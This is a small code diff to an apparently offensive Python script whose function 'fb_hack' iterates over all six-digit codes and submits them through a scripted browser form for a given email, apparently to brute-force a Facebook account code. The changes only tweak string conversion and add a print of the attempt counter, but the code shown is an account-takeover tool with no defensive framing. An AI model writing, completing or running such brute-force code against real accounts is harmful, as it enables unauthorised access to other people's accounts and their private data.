@@ -80,7 +80,7 @@ def fb_hack(email, codex):
     attempt = int(codex)
     print(check1)
     for combination in itertools.product(range(10), repeat=6):
-      y = (''.join(map(str, combination)))
+      y = str(''.join(map(str, combination)))
       attempt += 1
       try:
         browser.select_form(nr=0)
@@ -114,6 +114,7 @@ def fb_hack(email, codex):
           file.write(str(soup))
         with open("output1.txt", "w") as file:
           file.write(str(soup))
+        print(attempt)
         print("error")
         sys.exit()
       response1 = browser.response()
